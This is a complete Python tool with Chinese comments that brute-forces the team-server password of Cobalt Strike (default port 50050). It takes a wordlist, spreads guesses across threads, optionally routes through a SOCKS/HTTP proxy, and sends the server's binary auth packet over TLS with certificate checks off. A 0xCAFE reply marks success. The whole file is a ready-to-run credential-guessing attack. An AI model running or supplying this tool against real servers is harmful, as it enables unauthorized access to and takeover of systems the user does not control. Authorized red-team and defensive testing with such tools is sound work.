#!/usr/bin/env python3
import argparse
import concurrent.futures as futures
import socket
import ssl
import sys
import os
import threading
from urllib.parse import urlparse
from functools import partial

# 全局终止标志
stop_flag = threading.Event()

parser = argparse.ArgumentParser(description="Guess password for CS.")
parser.add_argument("-o", "--host", dest="host", type=str, help="CS服务端地址",required=True)
parser.add_argument("-p", "--port", dest="port", type=int, help="CS服务端端口",default=50050)
parser.add_argument("-r", "--password", dest="passwordList", type=str, help="密码字典文件路径",required=True)
parser.add_argument("-t", "--threads", dest="threads", type=int, help="线程数，默认根据cpu数*4",default=min(32, (os.cpu_count() or 1) * 4))
parser.add_argument("-proxy", "--proxy", dest="proxy", type=str, help="代理设置，例如socks5://127.0.0.1:1080")
args = parser.parse_args()

host = args.host
port = args.port
passwordList = args.passwordList
threadsNum = args.threads
proxy_config = None

# 解析代理配置
if args.proxy:
    try:
        import socks
    except ImportError:
        print("\033[31m[x] 使用代理需要安装PySocks库，请执行 pip install PySocks \033[0m")
        sys.exit(1)

    proxy_url = urlparse(args.proxy)
    proxy_scheme = proxy_url.scheme.lower()
    proxy_type_str = proxy_scheme if proxy_scheme else 'socks5'
    proxy_host = proxy_url.hostname
    proxy_port = proxy_url.port

    if not proxy_host or not proxy_port:
        print("\033[31m[x] 代理地址格式错误，应为协议://主机:端口 \033[0m")
        sys.exit(1)

    proxy_types = {
        'socks4': socks.PROXY_TYPE_SOCKS4,
        'socks5': socks.PROXY_TYPE_SOCKS5,
        'http': socks.PROXY_TYPE_HTTP
    }
    if proxy_type_str not in proxy_types:
        print(f"\033[31m[x] 不支持的代理类型: {proxy_type_str} ,请使用socks4/socks5/http \033[0m")
        sys.exit(1)

    proxy_config = {
        'type': proxy_types[proxy_type_str],
        'host': proxy_host,
        'port': proxy_port
    }

class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class DisconnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node


class Connector:
    def __init__(self):
        global proxy_config
        self.proxy_config = proxy_config
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE

    def is_connected(self):
        return self.sock and self.ssl_sock

    def connect(self, hostname, port):
        if stop_flag.is_set():  # 检查终止标志
            raise DisconnectedException("Connection aborted by stop flag")

        # 创建代理socket或普通socket
        if self.proxy_config:
            import socks
            self.sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.set_proxy(proxy_type=self.proxy_config['type'],addr=self.proxy_config['host'],port=self.proxy_config['port'])
        else:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.sock.settimeout(20)    # 一般10
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        try:
#             该代码不适用代理，存在代理服务绕过问题
#             if hostname == socket.gethostname():
#                 ipaddress = socket.gethostbyname_ex(hostname)[2][0]
#                 self.ssl_sock.connect((ipaddress, port))
#             else:
#                 self.ssl_sock.connect((hostname, port))
            self.ssl_sock.connect((hostname, port))
        except (socket.error, ssl.SSLError) as e:
            self.close()
            raise NotConnectedException(str(e))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.is_connected() or stop_flag.is_set():
            raise DisconnectedException()
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.is_connected() or stop_flag.is_set():
            raise DisconnectedException()

        received_size = 0
        data_buffer = b""

        while received_size < 4 and not stop_flag.is_set():
            try:
                data_in = self.ssl_sock.recv()
                if not data_in:  # 连接被关闭
                    raise DisconnectedException()
                data_buffer = data_buffer + data_in
                received_size += len(data_in)
            except (socket.timeout, ssl.SSLError):
                break
        return data_buffer

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.close()

def passwordcheck(password):
    if stop_flag.is_set() or not password:  # 提前终止检查
            return None
    if len(password) == 0:
        return False

    try:
        with Connector() as conn:
            conn.connect(args.host, args.port)

            payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(
                bytes(password, "ascii").ljust(256, b"A"))
            conn.send(payload)

            result = conn.receive()
        if result == bytearray(b"\x00\x00\xca\xfe"):
            return password
        else:
            return "It's Not "+password
    except Exception as e:
            return f"Error: {str(e)}"

def main():
    # 读取密码字典
    try:
        with open(passwordList, "r") as f:
            passwords = [p.strip() for p in f.read().split("\n") if p.strip()]
    except FileNotFoundError:
        print(f"\033[31m[x] 错误: 密码文件 {passwordList} 不存在 \033[0m")
        return

    if not passwords:
        print("\033[31m[x] 错误: 密码字典为空 \033[0m")
        return


    # 线程池管理
    with futures.ThreadPoolExecutor(max_workers=threadsNum) as executor:
        futures_dict = {executor.submit(passwordcheck, p): p for p in passwords}
        try:
            for future in futures.as_completed(futures_dict):
                if stop_flag.is_set():
                    break

                password = futures_dict[future]
                try:
                    result = future.result()
                    if result and "It's Not " not in result and "Error: " not in result:
                        print(f"\n\033[32m[+] 爆破成功! 目标 [{host}:{port}] 的密码为: {result}\033[0m")
                        stop_flag.set()  # 设置终止标志
                        break
                    else:
                        print(f"\033[31m[x] 尝试失败: {password}     \033[0m", end="\r")
                except Exception as e:
                    print(f"\033[33m[!] 异常: {password} -> {str(e)}\033[0m", end="\r")
        except KeyboardInterrupt:
            print("\n\033[33m[!] 用户中断操作，正在清理线程...\033[0m")
            stop_flag.set()
        finally:
            # 取消所有未完成任务
            for f in futures_dict:
                f.cancel()
            executor.shutdown(wait=False)
            os._exit(0)

if __name__ == "__main__":
    main()